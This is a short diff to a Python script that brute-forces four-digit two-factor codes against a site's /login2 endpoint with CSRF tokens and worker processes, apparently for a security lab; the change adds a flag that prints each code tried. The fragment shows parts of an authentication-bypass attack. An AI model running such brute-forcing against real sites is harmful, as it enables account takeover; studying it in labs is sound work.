@@ -6,6 +6,8 @@ from bs4 import BeautifulSoup
 
 # Const that enables / disables noisy prints made throughout program execution.
 DEBUG_MODE = False
+# A separate const that reports progress running attack.
+REPORT_POSITION = True
 # Total number of possible 2fa codes, 0 -> 9999, so 10k
 TOTAL_NUM_CODES = 10000
 # Default number of worker processes to find 2fa code, if none is provided as argument to program invocation.
@@ -107,6 +109,8 @@ def try_2fa_functional_unit(process_number):
         # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
         login2_url = f'https://{site}/login2'
         code = str(code_num).zfill(4)
+        if REPORT_POSITION:
+            print(f'trying 2fa code: {code}')
         login2data = {
             'csrf': csrf,
             'mfa-code': code
